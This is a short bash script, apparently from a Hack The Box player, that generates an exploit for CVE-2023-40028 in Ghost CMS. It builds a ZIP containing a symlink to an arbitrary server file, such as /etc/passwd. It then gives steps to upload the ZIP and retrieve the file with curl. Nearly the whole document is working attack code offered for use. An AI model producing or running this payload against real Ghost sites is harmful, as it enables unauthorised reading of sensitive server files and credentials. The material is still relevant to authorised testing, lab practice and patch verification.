#!/bin/bash

# Banner
cat << "EOF"

▒███████▒ ██░ ██  ███▄ ▄███▓▓█████ 
▒ ▒ ▒ ▄▀░▓██░ ██▒▓██▒▀█▀ ██▒▓█   ▀ 
░ ▒ ▄▀▒░ ▒██▀▀██░▓██    ▓██░▒███   
  ▄▀▒   ░░▓█ ░██ ▒██    ▒██ ▒▓█  ▄ 
▒███████▒░▓█▒░██▓▒██▒   ░██▒░▒████▒
░▒▒ ▓░▒░▒ ▒ ░░▒░▒░ ▒░   ░  ░░░ ▒░ ░
░░▒ ▒ ░ ▒ ▒ ░▒░ ░░  ░      ░ ░ ░  ░
░ ░ ░ ░ ░ ░  ░░ ░░      ░      ░   
  ░ ░     ░  ░  ░       ░      ░  ░
░                                  
https://app.hackthebox.com/profile/232712

 Exploit Title: Ghost Arbitrary File Read Payload Generator
 CVE: CVE-2023-40028
 Author: Zhme (inspired by Mohammad Yassine & [0xDTC])
 Description: Creates a ZIP payload with a symlink to read arbitrary files in Ghost CMS.
 Date: March 31, 2025
EOF

# Check if an argument is provided
if [ -z "$1" ]; then
    echo "[-] Error: No target file path provided."
    echo "[-] Usage: $0 <target_file_path>"
    echo "[-] Example: $0 /etc/passwd"
    exit 1
fi

# Variables
TARGET_FILE="$1"
TEMP_DIR="temp"
PAYLOAD_DIR="$TEMP_DIR/exploit/content/images/2024"
ZIP_NAME="exploit.zip"
SYMLINK_NAME="exploit.png"

# Clean up any existing temp directory and ZIP
rm -rf "$TEMP_DIR" "$ZIP_NAME"

# Create the directory structure
echo "[+] Creating payload directory structure..."
mkdir -p "$PAYLOAD_DIR"

# Create the symbolic link
echo "[+] Creating exploited symlink to $TARGET_FILE..."
ln -s "$TARGET_FILE" "$PAYLOAD_DIR/$SYMLINK_NAME"

# Change to the temp directory and create the ZIP
echo "[+] Zipping payload..."
cd "$TEMP_DIR" && zip -r -y "../$ZIP_NAME" "exploit/"

# Return to the original directory
cd ..

echo "[+] Exploit ZIP created: $ZIP_NAME"
echo "[+] Upload $ZIP_NAME to Ghost and visit /content/images/2024/$SYMLINK_NAME"
echo "[+] The browser will show an error, so use cli tools. "
echo "[+] i.e. curl http://127.0.0.1/content/images/2024/$SYMLINK_NAME"
